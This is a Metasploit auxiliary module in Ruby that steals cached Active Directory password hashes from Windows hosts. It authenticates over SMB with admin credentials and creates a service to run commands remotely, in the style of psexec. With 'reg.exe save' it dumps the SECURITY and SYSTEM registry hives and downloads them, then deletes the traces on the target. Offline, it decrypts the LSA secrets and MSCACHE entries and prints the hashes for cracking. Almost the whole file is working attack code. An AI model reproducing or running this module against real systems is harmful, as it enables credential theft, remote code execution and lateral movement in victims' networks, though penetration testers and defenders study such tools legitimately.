#!/usr/bin/env ruby

require 'msf/core'
require 'rex'
require 'rex/registry'
require 'fileutils'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Auxiliary

	# Exploit mixins should be called first
	include Msf::Exploit::Remote::SMB
	include Msf::Exploit::Remote::SMB::Authenticated
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner
	include Msf::Exploit::Remote::DCERPC

	# Aliases for common classes
	SIMPLE = Rex::Proto::SMB::SimpleClient
	XCEPT  = Rex::Proto::SMB::Exceptions
	CONST  = Rex::Proto::SMB::Constants

	def initialize
		super(
			'Name'        => 'SMB - Extract Domain Cached Hashes',
			'Version'     => '$Revision: 14976 $',
			'Description' => %Q{
				This module extracts cached AD user account password hashes from the SECURITY and SYSTEM hive files by authenticating
				to the target machine and downloading a copy of the hives.  The hashes are extracted offline on the attacking machine.  This all happenes without popping a shell or uploading
				anything to the target machine.  Local Admin credentials (password -or- hash) are required.  A ton of this code
				is sampled from the post/windows/gather/cachedump.rb module.
			},
			'Author'      =>
				[
					'Royce Davis <rdavis[at]accuvant.com>',
					'Twitter: <[at]R3dy__>',
					
				],
			'References'  => [
				['URL', 'http://www.pentestgeek.com'],
				['URL', 'http://www.accuvant.com'],
				['URL', 'http://sourceforge.net/projects/smbexec/']
			],
			'License'     => MSF_LICENSE
		)

		register_options([
			OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes']),
			OptString.new('RPORT', [true, 'The Target port son', 445]),
		], self.class)

		deregister_options('RHOST')
		datastore['LOGDIR'] += "#{Time.new.strftime("%Y-%m-%d-%H%M%S")}"	

	end



	#------------------------------------
	# This is the main control method
	#----------------------------------
	def run_host(ip)
		credentials = Rex::Ui::Text::Table.new(
		'Header'    => "MSCACHE Credentials",
		'Indent'    => 1,
		'Columns'   =>
		[
			"Username",
			"Hash",
			"Logon Domain Name",
			"DNS Domain Name",
			"Last Login",
			"UPN",
			"Effective Name",
			"Full Name",
			"Logon Script",
			"Profile Path",
			"Home Directory",
			"HomeDir Drive",
			"Primary Group",
			"Additional Groups"
		])
		
		secpath = "#{Rex::Text.rand_text_alpha(20)}"
		syspath = "#{Rex::Text.rand_text_alpha(20)}"
		hives = [secpath, syspath]
		smbshare = datastore['SMBSHARE']
		logdir = datastore['LOGDIR']
		
		#Try and Connect to the target
		begin
			connect()
		rescue StandardError => connecterror
			return
		end

		#Try and authenticate with given credentials
		begin
			smb_login()
		rescue StandardError => autherror
			print_error("#{ip} - #{autherror}")
			return
		end
		
		begin
			simple.connect(smbshare)
			save_reg_hives(smbshare, ip, secpath, syspath)
			print_status("#{ip} - Downloading SYSTEM and SECURITY hive files.")
			download_hives(smbshare, ip, syspath, secpath, logdir)
			cleanup_after(smbshare, ip, secpath, syspath) 
			sys, sec = open_hives(logdir, ip)
			dump_cache_creds(sec, sys, ip, credentials)
			simple.connect(smbshare)
			disconnect()
		rescue StandardError => bang
			disconnect()
			return
		end
	end



	#--------------------------------------------------------------------------------------------------------
	# This method attempts to use reg.exe to generate copies of the SYSTEM, and SECURITY registry hives
	# and store them in the Windows Temp directory on the remote host
	#--------------------------------------------------------------------------------------------------------
	def save_reg_hives(smbshare, ip, secpath, syspath)
		print_status("Creating hive copies on #{ip}")
		begin
			# Try to save the hive files
			command = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C reg.exe save HKLM\\SECURITY C:\\WINDOWS\\Temp\\#{secpath} && reg.exe save HKLM\\SYSTEM C:\\WINDOWS\\Temp\\#{syspath}"
			psexec(smbshare, command)
		rescue StandardError => saveerror
			print_error("Unable to create hive copies on #{ip}")
			print_error("#{saveerror.class}: #{saveerror}")
			disconnect()
			return saveerror
		end
	end



	#-----------------------------------------------------------------------------
	# Method used to copy hive files from C:\WINDOWS\Temp* on the remote host
	# To the local file path specified in datastore['LOGDIR'] on attacking system
	#-----------------------------------------------------------------------------
	def download_hives(smbshare, ip, syspath, secpath, logdir)
		begin
			newdir = "#{logdir}/#{ip}"
			::FileUtils.mkdir_p(newdir) unless ::File.exists?(newdir)
			simple.connect("\\\\#{ip}\\#{smbshare}")
	
			# Get contents of hive file
			remotesec = simple.open("\\WINDOWS\\Temp\\#{secpath}", 'rob')
			remotesys = simple.open("\\WINDOWS\\Temp\\#{syspath}", 'rob')
			secdata = remotesec.read
			sysdata = remotesys.read
	
			# Save it to local file system
			localsec = File.open("#{logdir}/#{ip}/sec", "w+")
			localsys = File.open("#{logdir}/#{ip}/sys", "w+")
			localsec.write(secdata)
			localsys.write(sysdata)

			localsec.close
			localsys.close
			remotesec.close
			remotesys.close
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
		rescue StandardError => copyerror
			print_error("#{ip} - Unable to download hive copies from. #{copyerror}")
			simple.disconnect("\\\\#{ip}\\#{smbshare}")
			return copyerror
		end
	end

	
	
	#-------------------------------------------------------------------------------------------------------
	# This method should hopefully open up a hive file from yoru local system and allow interacting with it
	#-------------------------------------------------------------------------------------------------------
	def open_hives(path, ip)
		print_status("#{ip} - Opening hives on the local Attack system")
		sys = Rex::Registry::Hive.new("#{path}/#{ip}/sys")
		sec = Rex::Registry::Hive.new("#{path}/#{ip}/sec")
		return sys, sec
	end
	
	
	
	#-------------------------------------------------------------------------------------------------------------
	# This method runs the cleanup commands that delete the SYSTEM and SECURITY hive copies from the WINDOWS\Temp
	# directory on the target host
	#-------------------------------------------------------------------------------------------------------------
	def cleanup_after(smbshare, ip, secpath, syspath)
		print_status("Running cleanup on #{ip}")
		begin
			# Try and do cleanup
			simple.connect(smbshare)
			cleanup = "C:\\WINDOWS\\SYSTEM32\\cmd.exe /C del C:\\WINDOWS\\Temp\\#{secpath} C:\\WINDOWS\\Temp\\#{syspath}"
			psexec(smbshare, cleanup)
		rescue StandardError => cleanerror
			print_error("Unable to run cleanup, need to manually remove hive copies from windows temp directory.")
			print_error("#{cleanerror.class}: #{cleanerror}")
			simple.disconnect(smbshare)
			return cleanerror
		end
	end
	
	
	
	#-------------------------------------------------------
	# Extracts the Domain Cached hashes from the hive files
	#-------------------------------------------------------
	def dump_cache_creds(sec, sys, ip, credentials)
		print_status("#{ip} - Extracting Domain Cached Password hashes.")
		bootkey = get_boot_key(sys, ip)
		lsa_key = get_lsa_key(sec, bootkey)
		nlkm = get_nlkm(sec, lsa_key)
		begin
			print_status("Dumping cached credentials...")
			ok = sec.relative_query('\Cache')
			john = ""
			ok.value_list.values.each do |usr|
				if( "NL$Control" == usr.name) then
					next
				end
				begin
					nl = usr.value.data
				rescue
					next
				end
				cache = parse_cache_entry(nl)
				if ( cache.userNameLength > 0 )
					print_status("Reg entry: #{nl.unpack("H*")[0]}") if( datastore['DEBUG'] )
					print_status("Encrypted data: #{cache.enc_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
					print_status("Ch:  #{cache.ch.unpack("H*")[0]}") if( datastore['DEBUG'] )
					if( @vista == 1 )
						dec_data = decrypt_hash_vista(cache.enc_data, nlkm, cache.ch)
					else
						dec_data = decrypt_hash(cache.enc_data, nlkm, cache.ch)
					end
					print_status("Decrypted data: #{dec_data.unpack("H*")[0]}") if( datastore['DEBUG'] )
					john += parse_decrypted_cache(dec_data, cache, credentials)
				end
			end
			print_status("John the Ripper format:")
			john.split("\n").each do |pass|
				print_good("#{pass}  -  #{ip}")
			end
			if( @vista == 1 )
				vprint_status("Hash are in MSCACHE_VISTA format. (mscash2)")
			else
				vprint_status("Hash are in MSCACHE format. (mscash)")
			end
		rescue StandardError => e
			print_status("No cached hashes found on #{ip}")
		end

	end
	
	
	#-----------------------------------------------------------------
	# Extract the NLKM value from the SECURITY hive using the Lsa key
	#-----------------------------------------------------------------
	def get_nlkm(sec, lsa_key)
		nlkm = sec.relative_query('\Policy\Secrets\NL$KM\CurrVal').value_list.values[0].value.data 
		decrypted = decrypt_secret( nlkm[0xC..-1], lsa_key )
		return decrypted	
	end
	
	
	
	#------------------------
	# Decrypt a single hash
	#------------------------
	def decrypt_hash(edata, nlkm, ch)
		rc4key = OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new('md5'), nlkm, ch)
		rc4 = OpenSSL::Cipher::Cipher.new("rc4")
		rc4.key = rc4key
		dec  = rc4.update(edata)
		dec << rc4.final
		
		return dec
	end
	
	
	
	#----------------------------------------------------	
	# Code sampled from post/windows/gather/cachedump.rb
	#----------------------------------------------------
	def parse_decrypted_cache(dec_data, s, credentials)

		i = 0
		hash = dec_data[i...i+0x10]
		i+=72

		username = dec_data[i...i+(s.userNameLength)].split("\x00\x00").first.gsub("\x00", '')
		i+=s.userNameLength
		i+=2 * ( ( s.userNameLength / 2 ) % 2 )

		vprint_good "Username\t\t: #{username}"
		vprint_good "Hash\t\t: #{hash.unpack("H*")[0]}"

		last = Time.at(s.lastAccess)
		vprint_good "Last login\t\t: #{last.strftime("%F %T")} "

		domain = dec_data[i...i+s.domainNameLength+1]
		i+=s.domainNameLength

		if( s.dnsDomainNameLength != 0)
			dnsDomainName = dec_data[i...i+s.dnsDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.dnsDomainNameLength
			i+=2 * ( ( s.dnsDomainNameLength / 2 ) % 2 )
			vprint_good "DNS Domain Name\t: #{dnsDomainName.downcase}"
		end

		if( s.upnLength != 0)
			upn = dec_data[i...i+s.upnLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.upnLength
			i+=2 * ( ( s.upnLength / 2 ) % 2 )
			vprint_good "UPN\t\t\t: #{upn}"
		end

		if( s.effectiveNameLength != 0 )
			effectiveName = dec_data[i...i+s.effectiveNameLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.effectiveNameLength
			i+=2 * ( ( s.effectiveNameLength / 2 ) % 2 )
			vprint_good "Effective Name\t: #{effectiveName}"
		end

		if( s.fullNameLength != 0 )
			fullName = dec_data[i...i+s.fullNameLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.fullNameLength
			i+=2 * ( ( s.fullNameLength / 2 ) % 2 )
			vprint_good "Full Name\t\t: #{fullName}"
		end

		if( s.logonScriptLength != 0 )
			logonScript = dec_data[i...i+s.logonScriptLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.logonScriptLength
			i+=2 * ( ( s.logonScriptLength / 2 ) % 2 )
			vprint_good "Logon Script\t\t: #{logonScript}"
		end

		if( s.profilePathLength != 0 )
			profilePath = dec_data[i...i+s.profilePathLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.profilePathLength
			i+=2 * ( ( s.profilePathLength / 2 ) % 2 )
			vprint_good "Profile Path\t\t: #{profilePath}"
		end

		if( s.homeDirectoryLength != 0 )
			homeDirectory = dec_data[i...i+s.homeDirectoryLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.homeDirectoryLength
			i+=2 * ( ( s.homeDirectoryLength / 2 ) % 2 )
			vprint_good "Home Directory\t\t: #{homeDirectory}"
		end

		if( s.homeDirectoryDriveLength != 0 )
			homeDirectoryDrive = dec_data[i...i+s.homeDirectoryDriveLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.homeDirectoryDriveLength
			i+=2 * ( ( s.homeDirectoryDriveLength / 2 ) % 2 )
			vprint_good "Home Directory Drive\t: #{homeDirectoryDrive}"
		end

		vprint_good "User ID\t\t: #{s.userId}"
		vprint_good "Primary Group ID\t: #{s.primaryGroupId}"

		relativeId = []
		while (s.groupCount > 0) do
			# Todo: parse attributes
			relativeId << dec_data[i...i+4].unpack("V")[0]
			i+=4
			attributes = dec_data[i...i+4].unpack("V")[0]
			i+=4
			s.groupCount-=1
		end

		vprint_good "Additional groups\t: #{relativeId.join ' '}"

		if( s.logonDomainNameLength != 0 )
			logonDomainName = dec_data[i...i+s.logonDomainNameLength+1].split("\x00\x00").first.gsub("\x00", '')
			i+=s.logonDomainNameLength
			i+=2 * ( ( s.logonDomainNameLength / 2 ) % 2 )
			vprint_good "Logon domain name\t: #{logonDomainName}"
		end

			credentials <<
				[
					username,
					hash.unpack("H*")[0],
					logonDomainName,
					dnsDomainName,
					last.strftime("%F %T"),
					upn,
					effectiveName,
					fullName,
					logonScript,
					profilePath,
					homeDirectory,
					homeDirectoryDrive,
					s.primaryGroupId,
					relativeId.join(' '),
				]

		vprint_good "----------------------------------------------------------------------"
		return "#{username.downcase}:#{hash.unpack("H*")[0]}:#{dnsDomainName.downcase}:#{logonDomainName.downcase}\n"
	end

	
	
	#----------------------------------------------------	
	# Code sampled from post/windows/gather/cachedump.rb
	#----------------------------------------------------
	def parse_cache_entry(cache_data)
		j = Struct.new(
			:userNameLength,
			:domainNameLength,
			:effectiveNameLength,
			:fullNameLength,
			:logonScriptLength,
			:profilePathLength,
			:homeDirectoryLength,
			:homeDirectoryDriveLength,
			:userId,
			:primaryGroupId,
			:groupCount,
			:logonDomainNameLength,
			:logonDomainIdLength,
			:lastAccess,
			:last_access_time,
			:revision,
			:sidCount,
			:valid,
			:sifLength,
			:logonPackage,
			:dnsDomainNameLength,
			:upnLength,
			:ch,
			:enc_data
		)

		s = j.new()

		s.userNameLength = cache_data[0,2].unpack("v")[0]
		s.domainNameLength =  cache_data[2,2].unpack("v")[0]
		s.effectiveNameLength = cache_data[4,2].unpack("v")[0]
		s.fullNameLength = cache_data[6,2].unpack("v")[0]
		s.logonScriptLength = cache_data[8,2].unpack("v")[0]
		s.profilePathLength = cache_data[10,2].unpack("v")[0]
		s.homeDirectoryLength = cache_data[12,2].unpack("v")[0]
		s.homeDirectoryDriveLength = cache_data[14,2].unpack("v")[0]

		s.userId = cache_data[16,4].unpack("V")[0]
		s.primaryGroupId = cache_data[20,4].unpack("V")[0]
		s.groupCount = cache_data[24,4].unpack("V")[0]
		s.logonDomainNameLength = cache_data[28,2].unpack("v")[0]
		s.logonDomainIdLength = cache_data[30,2].unpack("v")[0]

		#Removed ("Q") unpack and replaced as such
		thi = cache_data[32,4].unpack("V")[0]
		tlo = cache_data[36,4].unpack("V")[0]
		q = (tlo.to_s(16) + thi.to_s(16)).to_i(16)
		s.lastAccess = ((q / 10000000) - 11644473600)

		s.revision = cache_data[40,4].unpack("V")[0]
		s.sidCount = cache_data[44,4].unpack("V")[0]
		s.valid = cache_data[48,4].unpack("V")[0]
		s.sifLength = cache_data[52,4].unpack("V")[0]

		s.logonPackage  = cache_data[56,4].unpack("V")[0]
		s.dnsDomainNameLength = cache_data[60,2].unpack("v")[0]
		s.upnLength = cache_data[62,2].unpack("v")[0]

		s.ch = cache_data[64,16]
		s.enc_data = cache_data[96..-1]
		
		return s
	end
	
	
	
	#----------------------------------------------------	
	# Code sampled from post/windows/gather/cachedump.rb
	#----------------------------------------------------
	def convert_des_56_to_64(kstr)
		des_odd_parity = [
			1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
			16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
			32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
			49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
			64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
			81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
			97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
			112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
			128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
			145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
			161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
			176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
			193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
			208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
			224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
			241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
		]

		key = []
		str = kstr.unpack("C*")

		key[0] = str[0] >> 1
		key[1] = ((str[0] & 0x01) << 6) | (str[1] >> 2)
		key[2] = ((str[1] & 0x03) << 5) | (str[2] >> 3)
		key[3] = ((str[2] & 0x07) << 4) | (str[3] >> 4)
		key[4] = ((str[3] & 0x0F) << 3) | (str[4] >> 5)
		key[5] = ((str[4] & 0x1F) << 2) | (str[5] >> 6)
		key[6] = ((str[5] & 0x3F) << 1) | (str[6] >> 7)
		key[7] = str[6] & 0x7F

		0.upto(7) do |i|
			key[i] = ( key[i] << 1)
			key[i] = des_odd_parity[key[i]]
		end
		return key.pack("C*")
	end

	
	
	#----------------------------------------------------	
	# Code sampled from post/windows/gather/cachedump.rb
	#----------------------------------------------------
	def decrypt_secret(secret, key)
		# Ruby implementation of SystemFunction005
		# the original python code has been taken from Credump
		j = 0
		decrypted_data = ''
		for i in (0...secret.length).step(8)
			enc_block = secret[i..i+7]
			block_key = key[j..j+6]
			des_key = convert_des_56_to_64(block_key)
			d1 = OpenSSL::Cipher::Cipher.new('des-ecb')

			d1.padding = 0
			d1.key = des_key
			d1o = d1.update(enc_block)
			d1o << d1.final
			decrypted_data += d1o
			j += 7
			if (key[j..j+7].length < 7 )
				j = key[j..j+7].length - 1
			end
		end
		dec_data_len = decrypted_data[0].ord
		return decrypted_data[8..8+dec_data_len]
	end
	
	
	
	#----------------------------------------------------	
	# Code sampled from post/windows/gather/cachedump.rb
	#----------------------------------------------------
	def decrypt_lsa(pol, encryptedkey)
		sha256x = Digest::SHA256.new()
		sha256x << encryptedkey
		(1..1000).each do
			sha256x << pol[28,32]
		end
		aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
		aes.key = sha256x.digest
		print_status("digest #{sha256x.digest.unpack("H*")[0]}") if( datastore['DEBUG'] )
		decryptedkey = ''
		for i in (60...pol.length).step(16)
			aes.decrypt
			aes.padding = 0
			xx = aes.update(pol[i...i+16])
			decryptedkey += xx
		end
		return decryptedkey
	end



	#----------------------------------------------------	
	# Code sampled from post/windows/gather/cachedump.rb
	#----------------------------------------------------
	def get_lsa_key(sec, bootkey)
		begin
			enc_reg_key = sec.relative_query('\Policy\PolSecretEncryptionKey')
			obf_lsa_key = enc_reg_key.value_list.values[0].value.data
			@vista = 0
		rescue 
			enc_reg_key = sec.relative_query('\Policy\PolEKList')
			obf_lsa_key = enc_reg_key.value_list.values[0].value.data 
			@vista = 1
		end
		
		if ( @vista == 1 )
			lsa_key = decrypt_lsa(obf_lsa_key, bootkey)
			lsa_key = lsa_key[68,32]
		else
			md5x = Digest::MD5.new()
			md5x.update(bootkey)
			(1..1000).each do
				md5x.update(obf_lsa_key[60,76])
				end

			rc4 = OpenSSL::Cipher::Cipher.new("rc4")
			rc4.key = md5x.digest()
			lsa_key	= rc4.update(obf_lsa_key[12,60])
			lsa_key << rc4.final
			lsa_key = lsa_key[0x10..0x20]
		end
		return lsa_key
	end
	
	

	#----------------------------------------------------	
	# Code sampled from post/windows/gather/cachedump.rb
	#----------------------------------------------------	
	def get_boot_key(hive, ip)
		begin
			vprint_status("Getting boot key")
			vprint_status("Root key: #{hive.root_key.name}")

			default_control_set = hive.value_query('\Select\Default').value.data.unpack("c").first

			vprint_status("Default ControlSet: ControlSet00#{default_control_set}")

			bootkey = ""
			basekey = "\\ControlSet00#{default_control_set}\\Control\\Lsa"

			%W{JD Skew1 GBG Data}.each do |k|
				ok = hive.relative_query(basekey + "\\" + k)
				return nil if not ok

				tmp = ""
				0.upto(ok.class_name_length - 1) do |i|
					next if i%2 == 1

					tmp << ok.class_name_data[i,1]
				end

				bootkey << [tmp].pack("H*")
			end
	
			keybytes = bootkey.unpack("C*")
				
				
			p = [8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7]
			scrambled = ""
			p.each do |i|
				scrambled << bootkey[i]
			end
			return scrambled
		rescue StandardError => boot_key_error
			print_error("#{ip} - Error extracting the boot key. #{boot_key_error}")
			return boot_key_error
		end
	end
	
	
	
	#------------------------------------------------------------------------------------------------------------------------
	# This code was stolen straight out of psexec.rb.  Thanks very much for all who contributed to that module!!
	# Instead of uploading and runing a binary.  This method runs a single windows command fed into the #{command} paramater
	#------------------------------------------------------------------------------------------------------------------------
	def psexec(smbshare, command)
		filename = "filename"
		servicename = "servicename"
		simple.disconnect(smbshare)

		simple.connect("IPC$")

		handle = dcerpc_handle('367abb81-9844-35f1-ad32-98f038001003', '2.0', 'ncacn_np', ["\\svcctl"])
		vprint_status("Binding to #{handle} ...")
		dcerpc_bind(handle)
		vprint_status("Bound to #{handle} ...")

		vprint_status("Obtaining a service manager handle...")
		scm_handle = nil
		stubdata =
			NDR.uwstring("\\\\#{rhost}") +
			NDR.long(0) +
			NDR.long(0xF003F)
		begin
			response = dcerpc.call(0x0f, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				scm_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		displayname = "displayname"
		holdhandle = scm_handle
		svc_handle  = nil
		svc_status  = nil

		stubdata =
			scm_handle +
			NDR.wstring(servicename) +
			NDR.uwstring(displayname) +

			NDR.long(0x0F01FF) + # Access: MAX
			NDR.long(0x00000110) + # Type: Interactive, Own process
			NDR.long(0x00000003) + # Start: Demand
			NDR.long(0x00000000) + # Errors: Ignore
			NDR.wstring( command ) +
			NDR.long(0) + # LoadOrderGroup
			NDR.long(0) + # Dependencies
			NDR.long(0) + # Service Start
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0) + # Password
			NDR.long(0)  # Password
		begin
			vprint_status("Attempting to execute #{command}")
			response = dcerpc.call(0x0c, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
				svc_status = dcerpc.last_response.stub_data[24,4]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception
		end

		vprint_status("Opening service...")
		begin
			stubdata =
				scm_handle +
				NDR.wstring(servicename) +
				NDR.long(0xF01FF)

			response = dcerpc.call(0x10, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
				svc_handle = dcerpc.last_response.stub_data[0,20]
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Starting the service...")
		stubdata =
			svc_handle +
			NDR.long(0) +
			NDR.long(0)
		begin
			response = dcerpc.call(0x13, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
			return
		end

		vprint_status("Removing the service...")
		stubdata =
			svc_handle +
			NDR.wstring("C:\\WINDOWS\\Temp\\sam")
		begin
			response = dcerpc.call(0x02, stubdata)
			if (dcerpc.last_response != nil and dcerpc.last_response.stub_data != nil)
			end
		rescue ::Exception => e
			print_error("Error: #{e}")
		end

		vprint_status("Closing service handle...")
		begin
			response = dcerpc.call(0x0, svc_handle)
		rescue ::Exception => e
			print_error("Error: #{e}")
		end
			
		begin
			#print_status("Deleting \\#{filename}...")
			select(nil, nil, nil, 1.0)
			#This is not really useful but will prevent double \\ on the wire :)
		if datastore['SHARE'] =~ /.[\\\/]/
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\sam")
		else
			simple.connect(smbshare)
			simple.delete("C:\\WINDOWS\\Temp\\sam")
		end

		rescue ::Interrupt
			raise $!
		rescue ::Exception
			#raise $!
		end
		simple.disconnect("IPC$")
		simple.disconnect(smbshare)

	end

end
